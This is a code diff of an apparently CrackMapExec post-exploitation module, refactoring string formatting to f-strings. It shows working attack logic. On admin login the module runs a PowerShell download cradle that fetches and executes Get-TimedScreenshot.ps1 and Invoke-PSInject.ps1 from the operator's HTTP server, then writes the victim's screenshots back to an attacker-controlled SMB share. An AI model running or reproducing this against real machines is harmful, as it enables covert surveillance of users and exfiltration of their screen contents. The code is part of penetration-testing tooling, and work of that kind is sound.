@@ -44,10 +44,9 @@ class CMEModule:
         self.smb_server.start()
 
     def on_admin_login(self, context, connection):
-        screen_folder = 'get_timedscreenshot_{}'.format(connection.host)
-        screen_command = 'Get-TimedScreenshot -Path \\\\{}\\{}\\{} -Interval {} -EndTime {}'.format(context.localip, self.share_name,
-                                                                                                    screen_folder, self.interval,
-                                                                                                    self.endtime)
+        screen_folder = f'get_timedscreenshot_{connection.host}'
+        screen_command = f'Get-TimedScreenshot -Path \\\\{context.localip}\\{self.share_name}\\{screen_folder} -Interval {self.interval} -EndTime {self.endtime}'
+
         screen_command = gen_ps_iex_cradle(context, 'Get-TimedScreenshot.ps1',
                                            screen_command, post_back=False)
 
@@ -57,18 +56,22 @@ class CMEModule:
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
-        if 'Invoke-PSInject.ps1' == request.path[1:]:
+        if request.path[1:] == 'Invoke-PSInject.ps1':
             request.send_response(200)
             request.end_headers()
 
             request.wfile.write(self.ps_script1)
 
-        elif 'Get-TimedScreenshot.ps1' == request.path[1:]:
+        elif request.path[1:] == 'Get-TimedScreenshot.ps1':
             request.send_response(200)
             request.end_headers()
 
             #We received the callback, so lets setup the folder to store the screenshots
-            screen_folder_path = os.path.join(context.log_folder_path, 'get_timedscreenshot_{}'.format(request.client_address[0]))
+            screen_folder_path = os.path.join(
+                context.log_folder_path,
+                f'get_timedscreenshot_{request.client_address[0]}',
+            )
+
             if not os.path.exists(screen_folder_path): os.mkdir(screen_folder_path)
             #context.log.success('Storing screenshots in {}'.format(screen_folder_path))
 
